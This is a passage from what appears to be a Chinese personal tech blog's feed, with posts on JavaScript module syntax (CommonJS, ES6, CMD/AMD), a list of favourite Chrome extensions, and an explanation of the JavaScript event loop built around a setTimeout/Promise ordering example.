模块</h4><p>CommonJS 模块的输出都定义在module.exports这个属性上面。Node 的import命令加载 CommonJS 模块，Node 会自动将module.exports属性，当作模块的默认输出，即等同于export default xxx。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// a.js</span><br><span class="line">module.exports = &#123;</span><br><span class="line">  foo: &apos;hello&apos;,</span><br><span class="line">  bar: &apos;world&apos;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 等同于</span><br><span class="line">export default &#123;</span><br><span class="line">  foo: &apos;hello&apos;,</span><br><span class="line">  bar: &apos;world&apos;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>一共有三种写法，可以拿到 CommonJS 模块的module.exports。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 写法一</span><br><span class="line">import baz from &apos;./a&apos;;</span><br><span class="line">// baz = &#123;foo: &apos;hello&apos;, bar: &apos;world&apos;&#125;;</span><br><span class="line"></span><br><span class="line">// 写法二</span><br><span class="line">import &#123;default as baz&#125; from &apos;./a&apos;;</span><br><span class="line">// baz = &#123;foo: &apos;hello&apos;, bar: &apos;world&apos;&#125;;</span><br><span class="line"></span><br><span class="line">// 写法三</span><br><span class="line">import * as baz from &apos;./a&apos;;</span><br></pre></td></tr></table></figure><h4 id="CommonJS-模块加载-ES6-模块"><a href="#CommonJS-模块加载-ES6-模块" class="headerlink" title="CommonJS 模块加载 ES6 模块"></a>CommonJS 模块加载 ES6 模块</h4><p>CommonJS 模块加载 ES6 模块，不能使用require命令，而要使用import()函数。ES6 模块的所有输出接口，会成为输入对象的属性。</p><h3 id="导出模块-1"><a href="#导出模块-1" class="headerlink" title="导出模块"></a>导出模块</h3><h4 id="导出方式"><a href="#导出方式" class="headerlink" title="导出方式"></a>导出方式</h4><p>1、多次使用export</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// profile.js</span><br><span class="line">export var firstName = &apos;Michael&apos;;</span><br><span class="line">export var lastName = &apos;Jackson&apos;;</span><br><span class="line">export var year = 1958;</span><br></pre></td></tr></table></figure><p>export命令对外部输出了三个变量。</p><p>2、导出对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// profile.js</span><br><span class="line">var firstName = &apos;Michael&apos;;</span><br><span class="line">var lastName = &apos;Jackson&apos;;</span><br><span class="line">var year = 1958;</span><br><span class="line"></span><br><span class="line">export &#123;firstName, lastName, year&#125;;</span><br></pre></td></tr></table></figure><p>3、直接导出单个变量、函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export function multiply(x, y) &#123;</span><br><span class="line">  return x * y;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>4、导出默认模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 正确</span><br><span class="line">export var a = 1;</span><br><span class="line"></span><br><span class="line">// 正确</span><br><span class="line">var a = 1;</span><br><span class="line">export default a;</span><br><span class="line"></span><br><span class="line">// 错误</span><br><span class="line">export default var a = 1;</span><br></pre></td></tr></table></figure><h4 id="导出注意点"><a href="#导出注意点" class="headerlink" title="导出注意点"></a>导出注意点</h4><p><strong>export命令规定的是对外的接口，必须与模块内部的变量建立一一对应关系。</strong>(简而言之导出的必须是对象的key)</p><blockquote><p>必须建议意义对应关系</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">export var year = 1958;</span><br><span class="line">//==</span><br><span class="line">export &#123;</span><br><span class="line">    year</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 报错</span><br><span class="line">export 1;</span><br><span class="line">// 报错</span><br><span class="line">var m = 1;</span><br><span class="line">export m;</span><br></pre></td></tr></table></figure><blockquote><p>上面两种写法都会报错，因为没有提供对外的接口。正确写法：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 写法一</span><br><span class="line">export var m = 1;</span><br><span class="line"></span><br><span class="line">// 写法二</span><br><span class="line">var m = 1;</span><br><span class="line">export &#123;m&#125;;</span><br><span class="line"></span><br><span class="line">// 写法三</span><br><span class="line">var n = 1;</span><br><span class="line">export &#123;n as m&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>同样的，function和class的输出，也必须遵守这样的写法。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 报错</span><br><span class="line">function f() &#123;&#125;</span><br><span class="line">export f;</span><br><span class="line"></span><br><span class="line">// 正确</span><br><span class="line">export function f() &#123;&#125;;</span><br><span class="line"></span><br><span class="line">// 正确</span><br><span class="line">function f() &#123;&#125;</span><br><span class="line">export &#123;f&#125;;</span><br></pre></td></tr></table></figure><p><strong>另外，export语句输出的接口，与其对应的值是动态绑定关系，即通过该接口，可以取到模块内部实时的值。</strong></p><h4 id="模块别名"><a href="#模块别名" class="headerlink" title="模块别名"></a>模块别名</h4><p>浏览器加载 <strong>ES6</strong> 模块，也使用<strong><code>&lt;script&gt;</code></strong>标签，但是要加入<strong>type=”module”</strong>属性</p><p>浏览器对于带有<strong>type=”module”</strong>的<strong><code>&lt;script&gt;</code></strong>，等同于打开了<strong><code>&lt;script&gt;</code>标签的defer</strong>属性。</p><blockquote><p>ES6 模块也允许内嵌在网页中</p></blockquote><ul><li>代码是在模块作用域之中运行，而不是在全局作用域运行。模块内部的顶层变量，外部不可见。</li><li>模块脚本自动采用严格模式，不管有没有声明use strict。</li><li>模块之中，可以使用import命令加载其他模块（.js后缀不可省略，需要提供绝对 URL 或相对 URL），也可以使用export命令输出对外接口。</li><li>模块之中，顶层的this关键字返回undefined，而不是指向window。也就是说，在模块顶层使用this关键字，是无意义的。</li><li>同一个模块如果加载多次，将只执行一次。</li></ul><blockquote><p>示例模块</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import utils from &apos;https://example.com/js/utils.js&apos;;</span><br><span class="line"></span><br><span class="line">const x = 1;</span><br><span class="line"></span><br><span class="line">console.log(x === window.x); //false</span><br><span class="line">console.log(this === undefined); // true</span><br></pre></td></tr></table></figure><h3 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h3><p>使用export命令定义了模块的对外接口以后，其他 JS 文件就可以通过import命令加载这个模块。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// main.js</span><br><span class="line">import &#123;firstName, lastName, year&#125; from &apos;./profile.js&apos;;</span><br><span class="line"></span><br><span class="line">function setName(element) &#123;</span><br><span class="line">  element.textContent = firstName + &apos; &apos; + lastName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意，import命令具有提升效果，会提升到整个模块的头部，首先执行。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">foo();</span><br><span class="line">import &#123; foo &#125; from &apos;my_module&apos;;</span><br><span class="line"></span><br><span class="line">// ===&gt;</span><br><span class="line"></span><br><span class="line">import &#123; foo &#125; from &apos;my_module&apos;;</span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><blockquote><p>导入默认模块</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// export-default.js</span><br><span class="line">export default function () &#123;</span><br><span class="line">  console.log(&apos;foo&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// import-default.js</span><br><span class="line">import customName from &apos;./export-default&apos;;</span><br><span class="line">customName(); // &apos;foo&apos;</span><br></pre></td></tr></table></figure><h4 id="导入别名设置"><a href="#导入别名设置" class="headerlink" title="导入别名设置"></a>导入别名设置</h4><p>将surname是lastName的别名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#123; lastName as surname &#125; from &apos;./profile.js&apos;;</span><br></pre></td></tr></table></figure><p>将多个方法融合成一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// circle.js</span><br><span class="line"></span><br><span class="line">export function area(radius) &#123;</span><br><span class="line">  return Math.PI * radius * radius;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export function circumference(radius) &#123;</span><br><span class="line">  return 2 * Math.PI * radius;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import * as circle from &apos;./circle&apos;;</span><br><span class="line"></span><br><span class="line">console.log(&apos;圆面积：&apos; + circle.area(4));</span><br><span class="line">console.log(&apos;圆周长：&apos; + circle.circumference(14));</span><br></pre></td></tr></table></figure><h4 id="按需加载"><a href="#按需加载" class="headerlink" title="按需加载"></a>按需加载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import(&apos;./utils.js&apos;)</span><br><span class="line">.then(Util =&gt; &#123;</span><br><span class="line">    console.log(Util);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h2><p>CMD(common module definition), 是sea.js在推广过程中对模块定义的规范化产出，主要用于浏览器端。推崇依赖就近、延迟执行。它的核心思想是：每个文件都是一个模块，在模块中定义的变量、函数、类都是私有的，对外不可见。有一个全局性方法require()，用于加载模块</p><p>AMD规范（Asynchronous Module Definition）：是 RequireJS 在推广过程中对模块定义的规范化产出，也是主要用于浏览器端。其特点是：依赖前置，需要在定义时就写好需要的依赖，提前执行依赖，应用有require.js</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://javascript.ruanyifeng.com/nodejs/module.html#toc0" target="_blank" rel="noopener">CommonJS规范</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在学习新一个东西前，最好的办法是了解它能给我们带来什么好处我们为什么学习它，从而激发学习兴趣，哈哈哈~又扯了一堆，下面进入我们前端模块化探索之旅吧。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;模块化的历史&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在正式进入模块化学习前我们来了解一下前端模块化的前生今世。&lt;/p&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>chrome常用插件</title>
    <link href="http://zhoushaw.github.io/2019/03/16/other/tool/chrome-extend/"/>
    <id>http://zhoushaw.github.io/2019/03/16/other/tool/chrome-extend/</id>
    <published>2019-03-16T03:08:32.000Z</published>
    <updated>2019-04-20T12:39:57.663Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>chrome可以称之为前端开发者的神器，不管是开发还是调试。并且chrome给用户带来的体验简直QAQ，chrome插件无疑会大大提供工作效率，这里将会列出个人常用的chrome插件</p><div><a id="more"></a></div><h2 id="插件列表"><a href="#插件列表" class="headerlink" title="插件列表"></a>插件列表</h2><blockquote><p>Fair AdBlocker</p></blockquote><p>远离那些讨厌的广告吧。<br>右击选中对应命令，点击要消除的element，即可永久消除对应的AdBlocker。</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190316_2a13j39fgc4a8l7db14kh8438jekg_648x398.png" alt=""></p><p>总结来说:嗯！真香</p><blockquote><p>Infinity</p></blockquote><p>Infinity,超棒的无广告，体验好的。导航页</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190316_0l5glj75lb0b6fb6hdf727ea1ij7f_1235x860.png" alt=""></p><blockquote><p>Allow-Control-Allow-Origin</p></blockquote><p>解决跨域神器。有时候后端跟你说，线下不支持跨域？？没办法自己支持吧，就用这个神器</p><blockquote><p>Tampermonkey</p></blockquote><p>俗称为猴油浏览器插件，支持第三方JS注入，实现比较酷炫的事情。<br><img src="https://s10.mogucdn.com/mlcdn/c45406/190419_122h6g0jhf8c2353fga0gaecb51ee_2494x556.png" alt=""></p><p>下面列举一下：</p><ul><li>豆瓣资源大师<br><img src="https://s10.mogucdn.com/mlcdn/c45406/190419_4g6gk82abld135e11d57gi7b90g77_2472x1330.png" alt=""></li><li>百度云下载助手<br><img src="https://s10.mogucdn.com/mlcdn/c45406/190419_4b5l6ahibd5cgfdd4cj7dc3e76bcb_1966x1296.png" alt=""></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;chrome可以称之为前端开发者的神器，不管是开发还是调试。并且chrome给用户带来的体验简直QAQ，chrome插件无疑会大大提供工作效率，这里将会列出个人常用的chrome插件&lt;/p&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="tool" scheme="http://zhoushaw.github.io/categories/tool/"/>
    
    
      <category term="chrome" scheme="http://zhoushaw.github.io/tags/chrome/"/>
    
  </entry>
  
  <entry>
    <title>Event loop</title>
    <link href="http://zhoushaw.github.io/2019/03/01/learning/font-end/event%20loop/"/>
    <id>http://zhoushaw.github.io/2019/03/01/learning/font-end/event loop/</id>
    <published>2019-02-28T20:36:35.000Z</published>
    <updated>2019-04-14T13:54:11.947Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>请问下面输出的结果是什么</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">console.log(&apos;script start&apos;);</span><br><span class="line"></span><br><span class="line">setTimeout(function() &#123;</span><br><span class="line">  console.log(&apos;setTimeout&apos;);</span><br><span class="line">&#125;, 0);</span><br><span class="line"></span><br><span class="line">Promise.resolve().then(function() &#123;</span><br><span class="line">  console.log(&apos;promise1&apos;);</span><br><span class="line">&#125;).then(function() &#123;</span><br><span class="line">  console.log(&apos;promise2&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(&apos;script end&apos;);</span><br></pre></td></tr></table></figure><p>纳尼？？仿佛又回想了当初被面试官支配时的恐惧了！！</p><p>骚年稳住别慌，这道面试题考察的是你对Event loop事件循环的理解，当你深入了解浏览器或Node中如何处理事件循环的时候，上面此类题目对你来说就是so easy，好了话不多说让我们快速进入正题吧。</p><div><a id="more"></a></div><h2 id="Event-loop"><a href="#Event-loop" class="headerlink" title="Event loop"></a>Event loop</h2><blockquote><p>是什么</p></blockquote><p><strong>Event loop</strong>即事件循环，是浏览器和Node环境中运行<strong>单线程JavaScript</strong>一种不阻塞运行的一种机制。也就是我们常常称之为的异步的原理。</p><blockquote><p>有什么作用</p></blockquote><ul><li><p>类似于上面问答中的代码，一般情况下是不会产生的。但是由于一些业务场景迫使我们<strong>不可避免的编写出多个异步事件</strong>，而我们对其<strong>运行顺序不知其所以然</strong>，难免会造成不必要的困扰</p></li><li><p>当然Event loop也是面试场上的常胜将军，大多数同学都<strong>折戟于此</strong></p></li><li><p>市场上框架、新技术层出不穷，想要在风云突变的战场上稳住脚跟就必须<strong>修炼好内功</strong>，了解一些底层原理无非是非常好的路径</p></li></ul><h2 id="储备知识"><a href="#储备知识" class="headerlink" title="储备知识"></a>储备知识</h2><p>在正式Event loop讲解前，我们先回顾一下基本数据结构知识</p><blockquote><p>队列</p></blockquote><p>队列是一种操作受限制的线性表，它只运行从<strong>表的前端(front)</strong>进行删除操作，<strong>表的后端(rear)</strong>进行添加操作。</p><p>进行删除操作的称之为<strong>表头</strong>，添加操作的称之为<strong>表尾</strong>，空的队列称之为<strong>空队列</strong>。</p><p>队列的线性结构赋予<strong>其先进先出</strong>的特性</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190301_80cgh13fd23fjkahjd296l7ig9e68_1152x241.jpg" alt=""></p><blockquote><p>栈</p></blockquote><p>栈是一种操作受限制的线性表，它只运行从表的<strong>尾端(rear)</strong>进行<strong>添加操作和删除操作</strong></p><p>栈的限制结构赋予其<strong>先进后出</strong>的特性</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190301_3g51f9k9h099ga3lecj98d6adchh5_1344x752.jpg" alt=""></p><h2 id="Event-loop任务"><a href="#Event-loop任务" class="headerlink" title="Event loop任务"></a>Event loop任务</h2><p>在JavaScript中，会将执行的任务分为两类，一种是<strong>宏任务</strong>(MacroTask)简称为<strong>Task</strong>,另一种是<strong>微任务</strong>(MicroTask)</p><blockquote><p>宏任务类型</p></blockquote><p><strong>script全部代码</strong>、<strong>setTimeout</strong>、<strong>setInterval</strong>、<strong>I/O</strong>、<strong>UI Rendering</strong></p><blockquote><p>微任务</p></blockquote><p><strong>Process.nextTick</strong>（Node独有）、<strong>Promise</strong>、<strong>MutationObserver</strong></p><h2 id="浏览器Event-loop"><a href="#浏览器Event-loop" class="headerlink" title="浏览器Event loop"></a>浏览器Event loop</h2><p>在JavaScript中有一个<strong>主线程</strong>(main thread) 和<strong>调用栈</strong> (call-stack) ,所有任务都会被放到调用栈等待主线程执行。</p><blockquote><p>JS调用栈</p></blockquote><p>JS调用栈采用栈结构，是先进后出规则，当函数执行的时候会放到栈的顶部，当函数执行完成会将函数从栈顶移除，遇到新函数会新函数将推入栈内，执行完成从栈顶移除，直到栈被清空</p><p>列如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function task1 () &#123;</span><br><span class="line">    console.log(&apos;task1&apos;);</span><br><span class="line">&#125;</span><br><span class="line">function task2 () &#123;</span><br><span class="line">    task1();</span><br><span class="line">    console.log(&apos;hello world&apos;);</span><br><span class="line">&#125;</span><br><span class="line">task2();</span><br></pre></td></tr></table></figure><p>执行到task1()时，栈内容为:task2 task1，依次执行并移除task1、task2</p><blockquote><p>同步任务和异步任务</p></blockquote><p>在JavaScript将任务分为同步任务和异步任务，同步任务将依次放入调用栈中按照先进后出的规则，放入主线程执行。异步任务则是等待执行结果返回后放入任务队列中等待主线程空闲时(调用栈为空时，同步任务被执行完成时)，被读取到调用栈内等待主线程执行。</p><p>简单来说可以将其区域分为三个区域:</p><ul><li>任务队列区</li><li>主线程执行区</li><li>MacroTask区</li><li>MicroTask区</li></ul><blockquote><p>任务之间执行顺序</p></blockquote><p>JavaScript代码在运行时，主线程顺序执行代码，按照栈的结构先进后出，将微任务存入微任务区，宏任务存入宏任务区。</p><p>##<br>当任务队列任务为空时，将会查看MicroTask区队列是否为空，若为空则查询MacroTask区并执行。若不为空则执行MicroTask区任务，若遇到任务中存在MacroTask将存入MacroTask区队尾。执行MicroTask任务完成后将，执行MacroTask区任务</p><h2 id="解答文章头部提出的问题"><a href="#解答文章头部提出的问题" class="headerlink" title="解答文章头部提出的问题"></a>解答文章头部提出的问题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">console.log(&apos;script start&apos;);</span><br><span class="line"></span><br><span class="line">setTimeout(function() &#123;</span><br><span class="line">  console.log(&apos;setTimeout&apos;);</span><br><span class="line">&#125;, 0);</span><br><span class="line"></span><br><span class="line">Promise.resolve().then(function() &#123;</span><br><span class="line">  console.log(&apos;promise1&apos;);</span><br><span class="line">&#125;).then(function() &#123;</span><br><span class="line">  console.log(&apos;promise2&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(&apos;script end&apos;);</span><br></pre></td></tr></table></figure><p>JavaScript在运行这段代码逐行执行，按照调用栈、宏任务、微任务执行过程如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">#过程一:</span><br><span class="line"></span><br><span class="line">MicroTask: </span><br><span class="line">MacroTask: setTimeout</span><br><span class="line"></span><br><span class="line">call-Task: </span><br><span class="line"></span><br><span class="line">Log: script start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#过程二:</span><br><span class="line"></span><br><span class="line">MicroTask: Promise.then</span><br><span class="line">MacroTask: setTimeout</span><br><span class="line"></span><br><span class="line">call-Task: </span><br><span class="line"></span><br><span class="line">Log: script start</span><br><span class="line"></span><br><span class="line">#过程三:</span><br><span class="line"></span><br><span class="line">MicroTask: </span><br><span class="line">MacroTask: setTimeout</span><br><span class="line"></span><br><span class="line">call-Task: Promise.then</span><br><span class="line"></span><br><span class="line">Log:  script start、 script end</span><br><span class="line"></span><br><span class="line">#过程四:</span><br><span class="line"></span><br><span class="line">MicroTask: Promise.then promise2</span><br><span class="line">MacroTask: setTimeout</span><br><span class="line"></span><br><span class="line">call-Task: </span><br><span class="line"></span><br><span class="line">Log:  script start、 script end、promise1</span><br><span class="line"></span><br><span class="line">#过程五:</span><br><span class="line"></span><br><span class="line">MicroTask: </span><br><span class="line">MacroTask: setTimeout</span><br><span class="line"></span><br><span class="line">call-Task: Promise.then promise2</span><br><span class="line"></span><br><span class="line">Log:  script start、 script end、promise1</span><br><span class="line"></span><br><span class="line">#过程五:</span><br><span class="line"></span><br><span class="line">MicroTask: </span><br><span class="line">MacroTask: setTimeout</span><br><span class="line"></span><br><span class="line">call-Task: </span><br><span class="line"></span><br><span class="line">Log:  script start、 script end、promise1、promise2</span><br><span class="line"></span><br><span class="line">#过程六:</span><br><span class="line"></span><br><span class="line">MicroTask: </span><br><span class="line">MacroTask:</span><br><span class="line"></span><br><span class="line">call-Task: setTimeout</span><br><span class="line"></span><br><span class="line">Log:  script start、 script end、promise1、promise2</span><br><span class="line"></span><br><span class="line">#过程七:</span><br><span class="line"></span><br><span class="line">MicroTask: </span><br><span class="line">MacroTask:</span><br><span class="line"></span><br><span class="line">call-Task:</span><br><span class="line"></span><br><span class="line">Log:  script start、 script end、promise1、promise2、setTimeout</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;请问下面输出的结果是什么&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;console.log(&amp;apos;script start&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;setTimeout(function() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  console.log(&amp;apos;setTimeout&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;, 0);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Promise.resolve().then(function() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  console.log(&amp;apos;promise1&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span 